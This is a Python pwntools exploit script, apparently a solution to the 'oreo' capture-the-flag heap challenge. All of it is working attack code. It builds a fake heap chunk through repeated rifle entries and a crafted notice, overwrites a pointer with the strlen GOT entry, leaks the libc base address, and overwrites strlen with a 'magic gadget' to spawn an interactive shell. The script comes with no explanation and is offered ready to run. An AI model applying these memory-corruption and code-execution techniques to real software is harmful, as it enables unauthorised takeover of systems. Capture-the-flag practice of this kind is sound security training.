from pwn import *

FILENAME = "./oreo"
GDB = False
e = ELF(FILENAME, checksec=False)


def add_rifle(name, description):
    p.sendline("1")
    p.sendline(name)
    p.sendline(description)

def order():
    p.sendline("3")

def leave_notice(mex):
    p.sendline("4")
    p.sendline(mex)

def stats():
    p.sendline("5")


p = process(FILENAME, env={"LD_PRELOAD": "./libc.so.6"})

if GDB:
    gdb.attach(p)

msg_ptr = 0x0804a2a8

for i in range(0x40-1):
    add_rifle("a", "a")

payload = p8(0x61) * 27
payload += p32(msg_ptr)
# pause()
add_rifle(payload, "description")

payload = p8(0) * 36
payload += p32(0x1234)

leave_notice(payload)
order()


add_rifle("name", p32(e.got['strlen']))     # overwrite notice_ptr with strlen got address

stats()

p.recvuntil("Order Message: ")
libc_addr = u32(p.recvline()[:4]) - 0x7e440

log.success("LEAKED LIBC BASE ADDRESS: 0x%x!", libc_addr)

leave_notice(p32(libc_addr + 0x5fbc5))      # magic gadget


p.interactive()
p.close()
